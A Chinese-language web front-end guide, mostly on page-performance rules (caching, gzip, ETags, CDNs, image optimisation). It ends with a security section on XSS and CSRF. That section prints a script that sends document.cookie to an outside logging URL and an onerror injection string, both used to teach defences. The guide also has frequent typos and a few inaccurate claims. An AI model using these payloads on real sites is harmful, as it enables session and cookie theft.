Ajax经常被提及的一个好处就是由于其从后台服务器传输信息的异步性而为用户带来的反馈的即时性。但是，使用Ajax并不能保证用户不会在等待异步的JavaScript和XML响应上花费时间。在很多应用中，用户是否需要等待响应取决于Ajax如何来使用。例如，在一个基于Web的Email客户端中，用户必须等待Ajax返回符合他们条件的邮件查询结果。记住一点，“异步”并不异味着“即时”，这很重要。

为了提高性能，优化Ajax响应是很重要的。提高Ajxa性能的措施中最重要的方法就是使响应具有可缓存性，具体的讨论可以查看Add an Expires or a Cache-Control Header。其它的几条规则也同样适用于Ajax：

Gizp压缩文件

减少DNS查找次数

精简JavaScript

避免跳转

配置ETags

让我们来看一个例子：一个Web2.0的Email客户端会使用Ajax来自动完成对用户地址薄的下载。如果用户在上次使用过Email web应用程序后没有对地址薄作任何的修改，而且Ajax响应通过Expire或者Cacke-Control头来实现缓存，那么就可以直接从上一次的缓存中读取地址薄了。必须告知浏览器是使用缓存中的地址薄还是发送一个新的请求。这可以通过为读取地址薄的Ajax URL增加一个含有上次编辑时间的时间戳来实现，例如，&t=11900241612等。如果地址薄在上次下载后没有被编辑过，时间戳就不变，则从浏览器的缓存中加载从而减少了一次HTTP请求过程。如果用户修改过地址薄，时间戳就会用来确定新的URL和缓存响应并不匹配，浏览器就会重要请求更新地址薄。

即使你的Ajxa响应是动态生成的，哪怕它只适用于一个用户，那么它也应该被缓存起来。这样做可以使你的Web2.0应用程序更加快捷。

5、推迟加载内容

你可以仔细看一下你的网页，问问自己“哪些内容是页面呈现时所必需首先加载的？哪些内容和结构可以稍后再加载？

把整个过程按照onload事件分隔成两部分，JavaScript是一个理想的选择。例如，如果你有用于实现拖放和动画的JavaScript，那么它就以等待稍后加载，因为页面上的拖放元素是在初始化呈现之后才发生的。其它的例如隐藏部分的内容（用户操作之后才显现的内容）和处于折叠部分的图像也可以推迟加载

工具可以节省你的工作量：YUI Image Loader可以帮你推迟加载折叠部分的图片，YUI Get utility是包含JS和 CSS的便捷方法。比如你可以打开Firebug的Net选项卡看一下Yahoo的首页。

当性能目标和其它网站开发实践一致时就会相得益彰。这种情况下，通过程序提高网站性能的方法告诉我们，在支持JavaScript的情况下，可以先去除用户体验，不过这要保证你的网站在没有JavaScript也可以正常运行。在确定页面运行正常后，再加载脚本来实现如拖放和动画等更加花哨的效果。

6、预加载

预加载和后加载看起来似乎恰恰相反，但实际上预加载是为了实现另外一种目标。预加载是在浏览器空闲时请求将来可能会用到的页面内容（如图像、样式表和脚本）。使用这种方法，当用户要访问下一个页面时，页面中的内容大部分已经加载到缓存中了，因此可以大大改善访问速度。

下面提供了几种预加载方法：

无条件加载：触发onload事件时，直接加载额外的页面内容。以[Google.com](http://Google.com?fileGuid=6vX3hWyqpyWTRwHj)为例，你可以看一下它的spirit image图像是怎样在onload中加载的。这个spirit image图像在[google.com](http://google.com?fileGuid=6vX3hWyqpyWTRwHj)主页中是不需要的，但是却可以在搜索结果页面中用到它。

有条件加载：根据用户的操作来有根据地判断用户下面可能去往的页面并相应的预加载页面内容。在[search.yahoo.com](http://search.yahoo.com?fileGuid=6vX3hWyqpyWTRwHj)中你可以看到如何在你输入内容时加载额外的页面内容。

有预期的加载：载入重新设计过的页面时使用预加载。这种情况经常出现在页面经过重新设计后用户抱怨“新的页面看起来很酷，但是却比以前慢”。问题可能出在用户对于你的旧站点建立了完整的缓存，而对于新站点却没有任何缓存内容。因此你可以在访问新站之前就加载一部内容来避免这种结果的出现。在你的旧站中利用浏览器的空余时间加载新站中用到的图像的和脚本来提高访问速度。

7、减少DOM元素数量

一个复杂的页面意味着需要下载更多数据，同时也意味着JavaScript遍历DOM的效率越慢。比如当你增加一个事件句柄时在500和5000个DOM元素中循环效果肯定是不一样的。

大量的DOM元素的存在意味着页面中有可以不用移除内容只需要替换元素标签就可以精简的部分。你在页面布局中使用表格了吗？你有没有仅仅为了布局而引入更多的<div>元素呢？也许会存在一个适合或者在语意是更贴切的标签可以供你使用。

YUI CSS utilities可以给你的布局带来巨大帮助：grids.css可以帮你实现整体布局，font.css和reset.css可以帮助你移除浏览器默认格式。它提供了一个重新审视你页面中标签的机会，比如只有在语意上有意义时才使用<div>，而不是因为它具有换行效果才使用它。

DOM元素数量很容易计算出来，只需要在Firebug的控制台内输入：

document.getElementsByTagName('*').length

那么多少个DOM元素算是多呢？这可以对照有很好标记使用的类似页面。比如Yahoo!主页是一个内容非常多的页面，但是它只使用了700个元素（HTML标签）。

8、根据域名划分页面内容

把页面内容划分成若干部分可以使你最大限度地实现平行下载。由于DNS查找带来的影响你首先要确保你使用的域名数量在2个到4个之间。例如，你可以把用到的HTML内容和动态内容放在[www.example.org](http://www.example.org/?fileGuid=6vX3hWyqpyWTRwHj)上，而把页面各种组件（图片、脚本、CSS)分别存放在[statics1.example.org](http://statics1.example.org?fileGuid=6vX3hWyqpyWTRwHj)和[statics.example.org](http://statics.example.org?fileGuid=6vX3hWyqpyWTRwHj)上。

你可在Tenni Theurer和Patty Chi合写的文章Maximizing Parallel Downloads in the Carpool Lane找到更多相关信息。

9、使iframe的数量最小

ifrmae元素可以在父文档中插入一个新的HTML文档。了解iframe的工作理然后才能更加有效地使用它，这一点很重要。

<iframe>优点：

解决加载缓慢的第三方内容如图标和广告等的加载问题

Security sandbox

并行加载脚本

<iframe>的缺点：

即时内容为空，加载也需要时间

会阻止页面加载

没有语意

10、不要出现404错误

HTTP请求时间消耗是很大的，因此使用HTTP请求来获得一个没有用处的响应（例如404没有找到页面）是完全没有必要的，它只会降低用户体验而不会有一点好处。

有些站点把404错误响应页面改为“你是不是要找***”，这虽然改进了用户体验但是同样也会浪费服务器资源（如数据库等）。最糟糕的情况是指向外部JavaScript的链接出现问题并返回404代码。首先，这种加载会破坏并行加载；其次浏览器会把试图在返回的404响应内容中找到可能有用的部分当作JavaScript代码来执行。

11、使用内容分发网络

用户与你网站服务器的接近程度会影响响应时间的长短。把你的网站内容分散到多个、处于不同地域位置的服务器上可以加快下载速度。但是首先我们应该做些什么呢？

按地域布置网站内容的第一步并不是要尝试重新架构你的网站让他们在分发服务器上正常运行。根据应用的需求来改变网站结构，这可能会包括一些比较复杂的任务，如在服务器间同步Session状态和合并数据库更新等。要想缩短用户和内容服务器的距离，这些架构步骤可能是不可避免的。

要记住，在终端用户的响应时间中有80%到90%的响应时间用于下载图像、样式表、脚本、Flash等页面内容。这就是网站性能黄金守则。和重新设计你的应用程序架构这样比较困难的任务相比，首先来分布静态内容会更好一点。这不仅会缩短响应时间，而且对于内容分发网络来说它更容易实现。

内容分发网络（Content Delivery Network，CDN）是由一系列分散到各个不同地理位置上的Web服务器组成的，它提高了网站内容的传输速度。用于向用户传输内容的服务器主要是根据和用户在网络上的靠近程度来指定的。例如，拥有最少网络跳数（network hops）和响应速度最快的服务器会被选定。

一些大型的网络公司拥有自己的CDN，但是使用像Akamai Technologies，Mirror Image Internet， 或者Limelight Networks这样的CDN服务成本却非常高。对于刚刚起步的企业和个人网站来说，可能没有使用CDN的成本预算，但是随着目标用户群的不断扩大和更加全球化，CDN就是实现快速响应所必需的了。以Yahoo来说，他们转移到CDN上的网站程序静态内容节省了终端用户20%以上的响应时间。使用CDN是一个只需要相对简单地修改代码实现显著改善网站访问速度的方法。

12、为文件头指定Expires或Cache-Control

这条守则包括两方面的内容：

对于静态内容：设置文件头过期时间Expires的值为“Never expire”（永不过期）

对于动态内容：使用恰当的Cache-Control文件头来帮助浏览器进行有条件的请求

网页内容设计现在越来越丰富，这就意味着页面中要包含更多的脚本、样式表、图片和Flash。第一次访问你页面的用户就意味着进行多次的HTTP请求，但是通过使用Expires文件头就可以使这样内容具有缓存性。它避免了接下来的页面访问中不必要的HTTP请求。Expires文件头经常用于图像文件，但是应该在所有的内容都使用他，包括脚本、样式表和Flash等。

浏览器（和代理）使用缓存来减少HTTP请求的大小和次数以加快页面访问速度。Web服务器在HTTP响应中使用Expires文件头来告诉客户端内容需要缓存多长时间。下面这个例子是一个较长时间的Expires文件头，它告诉浏览器这个响应直到2010年4月15日才过期。

Expires: Thu, 15 Apr 2010 20:00:00 GMT

如果你使用的是Apache服务器，可以使用ExpiresDefault来设定相对当前日期的过期时间。下面这个例子是使用ExpiresDefault来设定请求时间后10年过期的文件头：

ExpiresDefault "access plus 10 years"

要切记，如果使用了Expires文件头，当页面内容改变时就必须改变内容的文件名。依Yahoo!来说我们经常使用这样的步骤：在内容的文件名中加上版本号，如yahoo_2.0.6.js。

使用Expires文件头只有会在用户已经访问过你的网站后才会起作用。当用户首次访问你的网站时这对减少HTTP请求次数来说是无效的，因为浏览器的缓存是空的。因此这种方法对于你网站性能的改进情况要依据他们“预缓存”存在时对你页面的点击频率（“预缓存”中已经包含了页面中的所有内容）。Yahoo!建立了一套测量方法，我们发现所有的页面浏览量中有75~85%都有“预缓存”。通过使用Expires文件头，增加了缓存在浏览器中内容的数量，并且可以在用户接下来的请求中再次使用这些内容，这甚至都不需要通过用户发送一个字节的请求。

13、Gzip压缩文件内容

网络传输中的HTTP请求和应答时间可以通过前端机制得到显著改善。的确，终端用户的带宽、互联网提供者、与对等交换点的靠近程度等都不是网站开发者所能决定的。但是还有其他因素影响着响应时间。通过减小HTTP响应的大小可以节省HTTP响应时间。

从HTTP/1.1开始，web客户端都默认支持HTTP请求中有Accept-Encoding文件头的压缩格式：

Accept-Encoding: gzip, deflate

如果web服务器在请求的文件头中检测到上面的代码，就会以客户端列出的方式压缩响应内容。Web服务器把压缩方式通过响应文件头中的Content-Encoding来返回给浏览器。

Content-Encoding: gzip

Gzip是目前最流行也是最有效的压缩方式。这是由GNU项目开发并通过RFC 1952来标准化的。另外仅有的一个压缩格式是deflate，但是它的使用范围有限效果也稍稍逊色。

Gzip大概可以减少70%的响应规模。目前大约有90%通过浏览器传输的互联网交换支持gzip格式。如果你使用的是Apache，gzip模块配置和你的版本有关：Apache 1.3使用mod_zip，而Apache 2.x使用moflate。

浏览器和代理都会存在这样的问题：浏览器期望收到的和实际接收到的内容会存在不匹配的现象。幸好，这种特殊情况随着旧式浏览器使用量的减少在减少。Apache模块会通过自动添加适当的Vary响应文件头来避免这种状况的出现。

服务器根据文件类型来选择需要进行gzip压缩的文件，但是这过于限制了可压缩的文件。大多数web服务器会压缩HTML文档。对脚本和样式表进行压缩同样也是值得做的事情，但是很多web服务器都没有这个功能。实际上，压缩任何一个文本类型的响应，包括XML和JSON，都值得的。图像和PDF文件由于已经压缩过了所以不能再进行gzip压缩。如果试图gizp压缩这些文件的话不但会浪费CPU资源还会增加文件的大小。

Gzip压缩所有可能的文件类型是减少文件体积增加用户体验的简单方法。

14、配置ETag

Entity tags（ETags）（实体标签）是web服务器和浏览器用于判断浏览器缓存中的内容和服务器中的原始内容是否匹配的一种机制（“实体”就是所说的“内容”，包括图片、脚本、样式表等）。增加ETag为实体的验证提供了一个比使用“last-modified date（上次编辑时间）”更加灵活的机制。Etag是一个识别内容版本号的唯一字符串。唯一的格式限制就是它必须包含在双引号内。原始服务器通过含有ETag文件头的响应指定页面内容的ETag。

HTTP/1.1 200 OK

Last-Modified: Tue, 12 Dec 2006 03:03:59 GMT

ETag: "10c24bc-4ab-457e1c1f"

Content-Length: 12195

稍后，如果浏览器要验证一个文件，它会使用If-None-Match文件头来把ETag传回给原始服务器。在这个例子中，如果ETag匹配，就会返回一个304状态码，这就节省了12195字节的响应。      GET /i/yahoo.gif HTTP/1.1

Host:[us.yimg.com](http://us.yimg.com?fileGuid=6vX3hWyqpyWTRwHj)

If-Modified-Since: Tue, 12 Dec 2006 03:03:59 GMT

If-None-Match: "10c24bc-4ab-457e1c1f"

HTTP/1.1 304 Not Modified

ETag的问题在于，它是根据可以辨别网站所在的服务器的具有唯一性的属性来生成的。当浏览器从一台服务器上获得页面内容后到另外一台服务器上进行验证时ETag就会不匹配，这种情况对于使用服务器组和处理请求的网站来说是非常常见的。默认情况下，Apache和IIS都会把数据嵌入ETag中，这会显著减少多服务器间的文件验证冲突。

Apache 1.3和2.x中的ETag格式为inode-size-timestamp。即使某个文件在不同的服务器上会处于相同的目录下，文件大小、权限、时间戳等都完全相同，但是在不同服务器上他们的内码也是不同的。

IIS 5.0和IIS 6.0处理ETag的机制相似。IIS中的ETag格式为Filetimestamp:ChangeNumber。用ChangeNumber来跟踪IIS配置的改变。网站所用的不同IIS服务器间ChangeNumber也不相同。 不同的服务器上的Apache和IIS即使对于完全相同的内容产生的ETag在也不相同，用户并不会接收到一个小而快的304响应；相反他们会接收一个正常的200响应并下载全部内容。如果你的网站只放在一台服务器上，就不会存在这个问题。但是如果你的网站是架设在多个服务器上，并且使用Apache和IIS产生默认的ETag配置，你的用户获得页面就会相对慢一点，服务器会传输更多的内容，占用更多的带宽，代理也不会有效地缓存你的网站内容。即使你的内容拥有Expires文件头，无论用户什么时候点击“刷新”或者“重载”按钮都会发送相应的GET请求。

如果你没有使用ETag提供的灵活的验证模式，那么干脆把所有的ETag都去掉会更好。Last-Modified文件头验证是基于内容的时间戳的。去掉ETag文件头会减少响应和下次请求中文件的大小。微软的这篇支持文稿讲述了如何去掉ETag。在Apache中，只需要在配置文件中简单添加下面一行代码就可以了：

FileETag none

15、尽早刷新输出缓冲

当用户请求一个页面时，无论如何都会花费200到500毫秒用于后台组织HTML文件。在这期间，浏览器会一直空闲等待数据返回。在PHP中，你可以使用flush()方法，它允许你把已经编译的好的部分HTML响应文件先发送给浏览器，这时浏览器就会可以下载文件中的内容（脚本等）而后台同时处理剩余的HTML页面。这样做的效果会在后台烦恼或者前台较空闲时更加明显。

输出缓冲应用最好的一个地方就是紧跟在<head />之后，因为HTML的头部分容易生成而且头部往往包含CSS和JavaScript文件，这样浏览器就可以在后台编译剩余HTML的同时并行下载它们。 例子：

```xml
 <!-- css, js -->
   </head>
   <?php flush(); ?>
   <body>
 <!-- content -->
```
为了证明使用这项技术的好处，Yahoo!搜索率先研究并完成了用户测试。
16、使用GET来完成AJAX请求

Yahoo!Mail团队发现，当使用XMLHttpRequest时，浏览器中的POST方法是一个“两步走”的过程：首先发送文件头，然后才发送数据。因此使用GET最为恰当，因为它只需发送一个TCP包（除非你有很多cookie）。IE中URL的最大长度为2K，因此如果你要发送一个超过2K的数据时就不能使用GET了。

一个有趣的不同就是POST并不像GET那样实际发送数据。根据HTTP规范，GET意味着“获取”数据，因此当你仅仅获取数据时使用GET更加有意义（从语意上讲也是如此），相反，发送并在服务端保存数据时使用POST。

17、把样式表置于顶部

在研究Yahoo!的性能表现时，我们发现把样式表放到文档的<head />内部似乎会加快页面的下载速度。这是因为把样式表放到<head />内会使页面有步骤的加载显示。

注重性能的前端服务器往往希望页面有秩序地加载。同时，我们也希望浏览器把已经接收到内容尽可能显示出来。这对于拥有较多内容的页面和网速较慢的用户来说特别重要。向用户返回可视化的反馈，比如进程指针，已经有了较好的研究并形成了正式文档。在我们的研究中HTML页面就是进程指针。当浏览器有序地加载文件头、导航栏、顶部的logo等对于等待页面加载的用户来说都可以作为可视化的反馈。这从整体上改善了用户体验。

把样式表放在文档底部的问题是在包括Internet Explorer在内的很多浏览器中这会中止内容的有序呈现。浏览器中止呈现是为了避免样式改变引起的页面元素重绘。用户不得不面对一个空白页面。

HTML规范清楚指出样式表要放包含在页面的<head />区域内：“和<a />不同，<link />只能出现在文档的<head />区域内，尽管它可以多次使用它”。无论是引起白屏还是出现没有样式化的内容都不值得去尝试。最好的方案就是按照HTML规范在文档<head />内加载你的样式表。

18、避免使用CSS表达式（Expression）

CSS表达式是动态设置CSS属性的强大（但危险）方法。Internet Explorer从第5个版本开始支持CSS表达式。下面的例子中，使用CSS表达式可以实现隔一个小时切换一次背景颜色：

background-color: expression( (new Date()).getHours()%2 ? "#B8D4FF" : "#F08A00" );

如上所示，expression中使用了JavaScript表达式。CSS属性根据JavaScript表达式的计算结果来设置。expression方法在其它浏览器中不起作用，因此在跨浏览器的设计中单独针对Internet Explorer设置时会比较有用。

表达式的问题就在于它的计算频率要比我们想象的多。不仅仅是在页面显示和缩放时，就是在页面滚动、乃至移动鼠标时都会要重新计算一次。给CSS表达式增加一个计数器可以跟踪表达式的计算频率。在页面中随便移动鼠标都可以轻松达到10000次以上的计算量。

一个减少CSS表达式计算次数的方法就是使用一次性的表达式，它在第一次运行时将结果赋给指定的样式属性，并用这个属性来代替CSS表达式。如果样式属性必须在页面周期内动态地改变，使用事件句柄来代替CSS表达式是一个可行办法。如果必须使用CSS表达式，一定要记住它们要计算成千上万次并且可能会对你页面的性能产生影响。

19、使用外部JavaScript和CSS

很多性能规则都是关于如何处理外部文件的。但是，在你采取这些措施前你可能会问到一个更基本的问题：JavaScript和CSS是应该放在外部文件中呢还是把它们放在页面本身之内呢？

在实际应用中使用外部文件可以提高页面速度，因为JavaScript和CSS文件都能在浏览器中产生缓存。内置在HTML文档中的JavaScript和CSS则会在每次请求中随HTML文档重新下载。这虽然减少了HTTP请求的次数，却增加了HTML文档的大小。从另一方面来说，如果外部文件中的JavaScript和CSS被浏览器缓存，在没有增加HTTP请求次数的同时可以减少HTML文档的大小。

关键问题是，外部JavaScript和CSS文件缓存的频率和请求HTML文档的次数有关。虽然有一定的难度，但是仍然有一些指标可以一测量它。如果一个会话中用户会浏览你网站中的多个页面，并且这些页面中会重复使用相同的脚本和样式表，缓存外部文件就会带来更大的益处。

许多网站没有功能建立这些指标。对于这些网站来说，最好的坚决方法就是把JavaScript和CSS作为外部文件引用。比较适合使用内置代码的例外就是网站的主页，如Yahoo!主页和My Yahoo!。主页在一次会话中拥有较少（可能只有一次）的浏览量，你可以发现内置JavaScript和CSS对于终端用户来说会加快响应时 间。

对于拥有较大浏览量的首页来说，有一种技术可以平衡内置代码带来的HTTP请求减少与通过使用外部文件进行缓存带来的好处。其中一个就是在首页中内置JavaScript和CSS，但是在页面下载完成后动态下载外部文件，在子页面中使用到这些文件时，它们已经缓存到浏览器了。

20、削减JavaScript和CSS

精简是指从去除代码不必要的字符减少文件大小从而节省下载时间。消减代码时，所有的注释、不需要的空白字符（空格、换行、tab缩进）等都要去掉。在JavaScript中，由于需要下载的文件体积变小了从而节省了响应时间。精简JavaScript中目前用到的最广泛的两个工具是JSMin和YUI Compressor。YUI Compressor还可用于精简CSS。

混淆是另外一种可用于源代码优化的方法。这种方法要比精简复杂一些并且在混淆的过程更易产生问题。在对美国前10大网站的调查中发现，精简也可以缩小原来代码体积的21%，而混淆可以达到25%。尽管混淆法可以更好地缩减代码，但是对于JavaScript来说精简的风险更小。

除消减外部的脚本和样式表文件外，<script>和<style>代码块也可以并且应该进行消减。即使你用Gzip压缩过脚本和样式表，精简这些文件仍然可以节省5%以上的空间。由于JavaScript和CSS的功能和体积的增加，消减代码将会获得益处。

21、用<link>代替@import

前面的最佳实现中提到CSS应该放置在顶端以利于有序加载呈现。

在IE中，页面底部@import和使用<link>作用是一样的，因此最好不要使用它。

22、避免使用滤镜

IE独有属性AlphaImageLoader用于修正7.0以下版本中显示PNG图片的半透明效果。这个滤镜的问题在于浏览器加载图片时它会终止内容的呈现并且冻结浏览器。在每一个元素（不仅仅是图片）它都会运算一次，增加了内存开支，因此它的问题是多方面的。

完全避免使用AlphaImageLoader的最好方法就是使用PNG8格式来代替，这种格式能在IE中很好地工作。如果你确实需要使用AlphaImageLoader，请使用下划线_filter又使之对IE7以上版本的用户无效。

23、把脚本置于页面底部

脚本带来的问题就是它阻止了页面的平行下载。HTTP/1.1 规范建议，浏览器每个主机名的并行下载内容不超过两个。如果你的图片放在多个主机名上，你可以在每个并行下载中同时下载2个以上的文件。但是当下载脚本时，浏览器就不会同时下载其它文件了，即便是主机名不相同。

在某些情况下把脚本移到页面底部可能不太容易。比如说，如果脚本中使用了document.write来插入页面内容，它就不能被往下移动了。这里可能还会有作用域的问题。很多情况下，都会遇到这方面的问题。

一个经常用到的替代方法就是使用延迟脚本。DEFER属性表明脚本中没有包含document.write，它告诉浏览器继续显示。不幸的是，Firefox并不支持DEFER属性。在Internet Explorer中，脚本可能会被延迟但效果也不会像我们所期望的那样。如果脚本可以被延迟，那么它就可以移到页面的底部。这会让你的页面加载的快一点。

24、剔除重复脚本

在同一个页面中重复引用JavaScript文件会影响页面的性能。你可能会认为这种情况并不多见。对于美国前10大网站的调查显示其中有两家存在重复引用脚本的情况。有两种主要因素导致一个脚本被重复引用的奇怪现象发生：团队规模和脚本数量。如果真的存在这种情况，重复脚本会引起不必要的HTTP请求和无用的JavaScript运算，这降低了网站性能。

在Internet Explorer中会产生不必要的HTTP请求，而在Firefox却不会。在Internet Explorer中，如果一个脚本被引用两次而且它又不可缓存，它就会在页面加载过程中产生两次HTTP请求。即时脚本可以缓存，当用户重载页面时也会产生额外的HTTP请求。

除增加额外的HTTP请求外，多次运算脚本也会浪费时间。在Internet Explorer和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。

一个避免偶尔发生的两次引用同一脚本的方法是在模板中使用脚本管理模块引用脚本。在HTML页面中使用<script />标签引用脚本的最常见方法就是：

<script type="text/javascript" src="menu_1.0.17.js"></script>

在PHP中可以通过创建名为insertScript的方法来替代：

<?php insertScript("menu.js") ?>

为了防止多次重复引用脚本，这个方法中还应该使用其它机制来处理脚本，如检查所属目录和为脚本文件名中增加版本号以用于Expire文件头等。

25、减少DOM访问

使用JavaScript访问DOM元素比较慢，因此为了获得更多的应该页面，应该做到：

缓存已经访问过的有关元素

线下更新完节点之后再将它们添加到文档树中

避免使用JavaScript来修改页面布局

有关此方面的更多信息请查看Julien Lecomte在YUI专题中的文章“高性能Ajax应该程序”。

26、开发智能事件处理程序

有时候我们会感觉到页面反应迟钝，这是因为DOM树元素中附加了过多的事件句柄并且些事件句病被频繁地触发。这就是为什么说使用event delegation（事件代理）是一种好方法了。如果你在一个div中有10个按钮，你只需要在div上附加一次事件句柄就可以了，而不用去为每一个按钮增加一个句柄。事件冒泡时你可以捕捉到事件并判断出是哪个事件发出的。

你同样也不用为了操作DOM树而等待onload事件的发生。你需要做的就是等待树结构中你要访问的元素出现。你也不用等待所有图像都加载完毕。

你可能会希望用DOMContentLoaded事件来代替onload，但是在所有浏览器都支持它之前你可使用YUI 事件应用程序中的onAvailable方法。

27、减小Cookie体积

HTTP coockie可以用于权限验证和个性化身份等多种用途。coockie内的有关信息是通过HTTP文件头来在web服务器和浏览器之间进行交流的。因此保持coockie尽可能的小以减少用户的响应时间十分重要。

有关更多信息可以查看Tenni Theurer和Patty Chi的文章“When the Cookie Crumbles”。这们研究中主要包括：

去除不必要的coockie

使coockie体积尽量小以减少对用户响应的影响

注意在适应级别的域名上设置coockie以便使子域名不受影响

设置合理的过期时间。较早地Expire时间和不要过早去清除coockie，都会改善用户的响应时间。

28、对于页面内容使用无coockie域名

当浏览器在请求中同时请求一张静态的图片和发送coockie时，服务器对于这些coockie不会做任何地使用。因此他们只是因为某些负面因素而创建的网络传输。所有你应该确定对于静态内容的请求是无coockie的请求。创建一个子域名并用他来存放所有静态内容。

如果你的域名是[www.example.org](http://www.example.org/?fileGuid=6vX3hWyqpyWTRwHj)，你可以在static.example.org上存在静态内容。但是，如果你不是在[www.example.org](http://www.example.org/?fileGuid=6vX3hWyqpyWTRwHj)上而是在顶级域名example.org设置了coockie，那么所有对于static.example.org的请求都包含coockie。在这种情况下，你可以再重新购买一个新的域名来存在静态内容，并且要保持这个域名是无coockie的。Yahoo!使用的是ymig.com，YouTube使用的是ytimg.com，Amazon使用的是images-anazon.com等等。

使用无coockie域名存在静态内容的另外一个好处就是一些代理（服务器）可能会拒绝对coockie的内容请求进行缓存。一个相关的建议就是，如果你想确定应该使用example.org还是[www.example.org](http://www.example.org/?fileGuid=6vX3hWyqpyWTRwHj)作为你的一主页，你要考虑到coockie带来的影响。忽略掉www会使你除了把coockie设置到*.example.org（*是泛域名解析，代表了所有子域名译者dudo注）外没有其它选择，因此出于性能方面的考虑最好是使用带有www的子域名并且在它上面设置coockie。

29、优化图像

设计人员完成对页面的设计之后，不要急于将它们上传到web服务器，这里还需要做几件事：

你可以检查一下你的GIF图片中图像颜色的数量是否和调色板规格一致。 使用imagemagick中下面的命令行很容易检查：

identify -verbose image.gif

如果你发现图片中只用到了4种颜色，而在调色板的中显示的256色的颜色槽，那么这张图片就还有压缩的空间。

尝试把GIF格式转换成PNG格式，看看是否节省空间。大多数情况下是可以压缩的。由于浏览器支持有限，设计者们往往不太乐意使用PNG格式的图片，不过这都是过去的事情了。现在只有一个问题就是在真彩PNG格式中的alpha通道半透明问题，不过同样的，GIF也不是真彩格式也不支持半透明。因此GIF能做到的，PNG（PNG8）同样也能做到（除了动画）。下面这条简单的命令可以安全地把GIF格式转换为PNG格式：

convert image.gif image.png

“我们要说的是：给PNG一个施展身手的机会吧！”

在所有的PNG图片上运行pngcrush（或者其它PNG优化工具）。例如：

pngcrush image.png -rem alla -reduce -brute result.png

在所有的JPEG图片上运行jpegtran。这个工具可以对图片中的出现的锯齿等做无损操作，同时它还可以用于优化和清除图片中的注释以及其它无用信息（如EXIF信息）：

jpegtran -copy none -optimize -perfect src.jpg dest.jpg

30、优化CSS Spirite

在Spirite中水平排列你的图片，垂直排列会稍稍增加文件大小；

Spirite中把颜色较近的组合在一起可以降低颜色数，理想状况是低于256色以便适用PNG8格式；

便于移动，不要在Spirite的图像中间留有较大空隙。这虽然不大会增加文件大小但对于用户代理来说它需要更少的内存来把图片解压为像素地图。100x100的图片为1万像素，而1000x1000就是100万像素。

31、不要在HTML中缩放图像

不要为了在HTML中设置长宽而使用比实际需要大的图片。如果你需要：

<img width="100" height="100" src="mycat.jpg" alt="My Cat" />

那么你的图片（mycat.jpg）就应该是100x100像素而不是把一个500x500像素的图片缩小使用。

32、favicon.ico要小而且可缓存

favicon.ico是位于服务器根目录下的一个图片文件。它是必定存在的，因为即使你不关心它是否有用，浏览器也会对它发出请求，因此最好不要返回一个404 Not Found的响应。由于是在同一台服务器上，它每被请求一次coockie就会被发送一次。这个图片文件还会影响下载顺序，例如在IE中当你在onload中请求额外的文件时，favicon会在这些额外内容被加载前下载。

因此，为了减少favicon.ico带来的弊端，要做到：

文件尽量地小，最好小于1K

在适当的时候（也就是你不要打算再换favicon.ico的时候，因为更换新文件时不能对它进行重命名）为它设置Expires文件头。你可以很安全地把Expires文件头设置为未来的几个月。你可以通过核对当前favicon.ico的上次编辑时间来作出判断。

Imagemagick可以帮你创建小巧的favicon。

33、保持单个内容小于25K

这条限制主要是因为iPhone不能缓存大于25K的文件。注意这里指的是解压缩后的大小。由于单纯gizp压缩可能达不要求，因此精简文件就显得十分重要。

查看更多信息，请参阅Wayne Shea和Tenni Theurer的文件“Performance Research, Part 5: iPhone Cacheability - Making it Stick”。

34、打包组件成复合文本

把页面内容打包成复合文本就如同带有多附件的Email，它能够使你在一个HTTP请求中取得多个组件（切记：HTTP请求是很奢侈的）。当你使用这条规则时，首先要确定用户代理是否支持（iPhone就不支持）。

### 7.前端中的安全问题及防护，XSS、CSRF、sql 注入

* XSS：

是攻击者往Web页面里插入恶意 html标签或者javascript代码。   比如：攻击者在论坛中放一个

看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。

```xml
// 下面的的JavaScript代码就可以窃取Cookie
<script>
new Image().src="http://jehiah.com/_sandbox/log.cgi?c="+encodeURI(document.cookie);
</script>
//为了保证安全：请不停地重设session的重设；将过期时间设置短一些；监控referrer白名单与userAgent的值；使用HttpOnly禁止脚本读取Cookie。这些措施并非万无一失，但是增加了黑客的难度，因此也是有效的。
```
防范：
1.目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。

比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示

2.img标签的再次利用

img标签，在加载图片失败的时候，会调用该元素上的onerror事件。我们正可以利用这种方式来进行攻击。如果这张图片的地址我们换种写法呢？

```xml
<?php
    $imgsrc="\" onerror=\"javascript:alert('侯医生');\";
?>
```
我们之前说过，innerHTML赋值的script标签，不会被执行，但是innerHTML赋值一个img标签是可以被识别的。我们把img标签的左右尖括号，使用unicode进行伪装，让转义方法认不出来，即使innerHTML也可以利用上了.
**升级防御**

我们将输出的字符串中的\反斜杠进行转义(json转义)。这样，\就不会被当做unicode码的开头来被处理了.

**XSS再升级**

url上的参数，我们是无法提前对其进行转义的

如果黑客在URL的这个参数中，加入js代码，这样便又会被执行

**防御再次升级**

像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出

保护好你的cookie

如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的.设置 refer 白名单控制允许访问者。

* CSRF

CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。

其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。所以，我们日常的开发，还是要遵循提交业务，严格按照post请求去做的。更不要使用jsonp去做提交型的接口，这样非常的危险。

防御：

最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。

